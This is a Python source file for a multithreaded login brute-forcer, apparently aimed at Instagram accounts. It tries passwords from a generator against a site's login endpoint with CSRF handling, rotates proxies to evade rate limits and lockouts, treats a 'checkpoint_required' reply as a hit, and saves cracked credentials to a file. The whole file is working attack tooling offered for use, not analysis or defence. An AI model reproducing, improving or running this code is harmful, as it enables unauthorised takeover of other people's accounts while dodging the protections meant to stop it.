# Date: 05/05/2018
# Author: Pure-L0G1C
# Description: Bruter

import logging
from random import random, randint
from os import system, remove, path
from time import time, sleep 
from threading import Thread, Lock
from platform import system as platform
# from requests.exceptions import ConnectionError
from .const import max_fails, fetch_time, site_details, max_proxy_usage, credentials
from .spyder import Spyder 
from .scraper import Queue 
from .session import Session

logging.basicConfig(filename='pi_cracker_logs.log', filemode='w', #  level=logging.DEBUG, # %(asctime)s 
                    format='%(connection)s\t%(levelname)s\t%(threadName)s\t[%(password)s]\t%(message)s') #  [%(filename)s:%(lineno)d]
logger = logging.getLogger(__name__)

POOLING_DELAY_TIME = 1.5
MAX_THREADS = 16
MAX_LOGIN_THREADS = 200
PWD_PAD = 12

class Bruter(object):
  def __init__(self, username, pass_generator, threads):
    self.max_threads = threads if (1 <= threads <= MAX_LOGIN_THREADS) else MAX_THREADS # 16 is the absolute maximum
    self.cls = 'cls' if platform() == 'Windows' else 'clear'
    self.session = Session(username) #, wordlist)
    self.proxy_usage_count = 0
    self.pass_gen = pass_generator
    # self.wordlist = wordlist
    self.username = username
    self.user_abort = False
    self.passlist = pass_generator.pwd_buffer # Deueue
    self.spyder = Spyder()
    self.retrieve = False 
    self.isFound = False 
    self.isAlive = True
    self.lock = Lock()
    self.read = False 
    self.attempts = 0
    self.threads = 0 
    self.pwd = None
    self.ip = None 
    self.fails = 0
    self.last_thread_no = 0
    
    # reduce flickering display on Windows
    self.last_attempt = None
    self.last_proxy = None 
    self.last_ip = None 
    self.last_password = None

  # def check_username(self):
  #   br = self.spyder.br
  #   home_url = site_details['home_url']
  #   login_url = site_details['login_url']
  #   username_field = site_details['username_field']
  #   password_field = site_details['password_field']
    
  #   data = { username_field: self.username, password_field: "--random-password--" }
  #   br.headers.update({'X-CSRFToken': br.get(home_url).cookies.get_dict()['csrftoken']})
    
  #   # login 
  #   response = br.post(login_url, data=data, timeout=fetch_time)
  #   if response:
  #     response = response.json()
  #     if "user" in response:
  #       return response['user']
  #   return False

  def login(self, pwd):
    while all([self.isAlive, not self.isFound]): # stay alive until using password
      if not self.spyder.proxies.qsize:
        sleep(5) 

      with self.lock:
        self.pwd = pwd 
        self.threads += 1
        self.proxy_usage_count += 1

      log_extra_params = {'password':pwd, 'connection':self.ip.ljust(15)}

      try:
        self.spyder.renew_proxy()
        ip = self.spyder.ip_addr() 
        br = self.spyder.br
        home_url = site_details['home_url']
        login_url = site_details['login_url']
        username_field = site_details['username_field']
        password_field = site_details['password_field']
        
        data = { username_field: self.username, password_field: pwd }
        br.headers.update({'X-CSRFToken': br.get(home_url).cookies.get_dict()['csrftoken']})
        
        # login 
        response = br.post(login_url, data=data, timeout=fetch_time)
        
        # if not response:continue
        
        response = response.json()
        
        # validate
        if 'user' in response and response['user']==False:
          self.stop()  # username is NOT valid
          return 

        if 'authenticated' in response:
          if response['authenticated']:
            self.pwd_found(pwd)
            break
          else:
            with self.lock:
                self.attempts += 1 # we increase attempts only if a pwd is taken and failed in authentication
                self.last_password = pwd
              # if pwd in self.passlist:
              #   self.passlist.remove(pwd) 
            return
        # logger.warning("PWD-Removed", extra=log_extra_params)
        elif 'message' in response:
          if response['message'] == 'checkpoint_required':
            self.pwd_found(pwd)
            break
          elif response['status'] == 'fail': # account got locked
            if self.threads > 0:
              with self.lock:self.threads -= 1
          return
      # it will continue in loop till pwd authentication is false or true
      except KeyboardInterrupt:
        self.user_abort = True 
        self.stop()
      except Exception as ex:
        # e.g. ---> Max retries exceeded
        logger.error(ex, extra=log_extra_params)
        sleep(random()*2) # we add random time for sleeping to let threads overlapped

  def pwd_found(self, pwd):
    if self.isFound:return
    
    self.isFound = True
    self.last_password = pwd
    del self.passlist[:]
    self.display(pwd, True)
    raise StopIteration # to stop generating new pwd
  
  def kill(self):
    self.isAlive = False 
    self.spyder.isAlive = False 

  def display(self, pwd, isFound=False, n=1): 
    if not isFound:system(self.cls)
    else:
      with open(credentials, 'a') as f:
        f.write('Username: {}\nPassword: {}\n\n'.format(self.username, pwd))

    pwd = pwd if pwd else ''
    ip = '{}[{}]'.format(self.ip, self.spyder.proxy_info['country']) if all([self.ip, self.spyder.proxy_info]) else ''
      
    try:
      if not isFound:
        print('[-] Proxy-IP: {}\n[-] Bufer Size: {:02d}\n[-] Username: {}\n[-] Password: {}\n[-] Attempts: {}\n[-] Proxies: {}'.
              format(ip, len(self.passlist), self.username, pwd, self.attempts, self.spyder.proxies.qsize))
        if not n:self.display(pwd, isFound=True)
      else:
        if n:self.display(pwd, n-1)
        print('\n[!] Password Found\n[+] Username: {}\n[+] Password: {}'.format(self.username, pwd))
    except:pass

  def attack(self):
    while all([not self.isFound, self.isAlive, not self.pass_gen.finished]):
      try:
        if any([not self.ip, self.proxy_usage_count >= max_proxy_usage, self.fails >= max_fails]):
          try:
            if not self.spyder.proxies.qsize:continue
            self.spyder.renew_proxy()
            ip = self.spyder.ip_addr() 
            if not ip:continue
            self.proxy_usage_count = 0
            self.fails = 0
            self.ip = ip
          except KeyboardInterrupt:
            self.user_abort = True 
            self.stop()
          except Exception as ex:
            logger.error(ex)

        # try all the passwords in the queue   # NEW: ---> try all password in generator
        for pwd in self.passlist:
          if self.threads >= self.max_threads:break # stop if threads exceeded the limit
          if any([not self.isAlive, self.isFound]):break # stop if pwd found
          if self.proxy_usage_count >= max_proxy_usage or not self.spyder.proxies.qsize:break
					
          # login thread     
          login = Thread(name='login-%03d-%s'%(self.last_thread_no+1,pwd), target=self.login, args=[pwd])
          login.daemon = True
          login.start() 
          self.last_thread_no += 1 
        
        self.passlist.clear()
        if self.pass_gen.finished:
          self.sop()
          return
        self.pass_gen.check_buffer_thread.start()
				# wait time 
        started = time()
        
        # wait for threads 
        if all([not self.isFound, self.isAlive, self.threads>0, len(self.passlist)]): #, self.passlist.qsize]):
          try:
            # bypass slow, authentication required, and hanging proxies
            if int(time() - started) >= 5:
              self.fails = max_fails
              self.threads = 0
          except:pass
        else:    
          self.threads = 0
          if all([self.isAlive, not self.isFound]):
            self.session.write(self.attempts) #  self.pass_gen.last_pwd --> not logical
 
      except KeyboardInterrupt:
        self.user_abort = True 
        self.stop()
      except:pass
      
  def pwd_manager(self):
    # with open(self.wordlist, 'r') as wordlist:
    #   attempts = 0
      # for pwd in wordlist:
      #   if any([not self.isAlive, self.isFound]):break

      #   if self.retrieve:
      #     if attempts < (self.attempts + self.passlist.qsize)-1:
      #       attempts += 1
      #       continue
      #   else:self.retrieve = False

    #     if self.passlist.qsize <= self.max_threads:
    #       self.passlist.put(pwd.replace('\n', '').replace('\r', '').replace('\t', ''))
    #     else:
    #       while all([self.passlist.qsize, not self.isFound, self.isAlive]):pass

    #       if all([not self.passlist.qsize, not self.isFound, self.isAlive]):
    #         self.passlist.put(pwd.replace('\n', '').replace('\r', '').replace('\t', ''))
    # self.pass_gen.check_buffer_thread()
    # done reading wordlist
    # self.read = True if all([not self.user_abort, self.isAlive]) else False 

    while all([not self.isFound, self.isAlive, len(self.passlist) > 0]):
      try:sleep(POOLING_DELAY_TIME)
      except KeyboardInterrupt:
        self.user_abort = True 
        self.stop()
      except Exception as ex:return
      #   print("\n" + str(ex))
    if self.isAlive:self.stop()

  def stop(self, message=None):
    if any([self.read, self.isFound]):self.session.delete()
    else:self.session.write(self.attempts) # , self.pass_gen.last_pwd
    self.kill()
    self.pass_gen.stop_generator()
    return message

  def primary_threads(self):
    proxy_manager = Thread(target=self.spyder.proxy_manager)
    proxy_manager.daemon = True
    proxy_manager.start()

    # pwd_manager = Thread(target=self.pwd_manager)
    # pwd_manager.daemon = True
    # pwd_manager.start()

    attack = Thread(target=self.attack)
    attack.daemon = True
    attack.start()
 
  def start(self):
    self.pass_gen.fill_buffer()
    self.primary_threads()
    while all([not self.isFound, self.isAlive]):
      try:
        if self.isAlive:
          if self.ip:
            if any([self.last_attempt != self.attempts, self.last_proxy != self.spyder.proxies.qsize, self.last_ip != self.ip]):
              self.display(self.pwd)
              self.last_proxy = self.spyder.proxies.qsize
              self.last_attempt = self.attempts
              self.last_ip = self.ip
          else:self.display(self.pwd)
          if not self.spyder.proxy_info:
            print('\n[+] Searching for proxies ...')
          sleep(POOLING_DELAY_TIME if not self.spyder.proxy_info else POOLING_DELAY_TIME/3)
      except KeyboardInterrupt:
        self.user_abort = True 
        self.stop()
